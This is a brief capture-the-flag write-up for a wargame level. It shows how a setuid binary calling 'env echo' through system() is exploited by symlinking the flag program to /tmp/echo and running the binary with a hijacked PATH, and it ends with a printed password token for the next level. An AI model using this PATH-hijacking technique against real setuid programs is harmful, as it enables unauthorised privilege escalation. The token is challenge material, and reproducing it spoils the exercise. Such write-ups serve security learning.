for this level we have a suid binary own by the user flag03

$> ./level03
Exploit me

after disassembling the binary we can see the problem here
	system("/usr/bin/env echo Exploit me")

we can change the PATH env variable to make echo point to getflag
for that we can simply do a symlink to getflag binary

$> ln -s /bin/getflag /tmp/echo
$> PATH=/tmp ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

this token is the level04's password
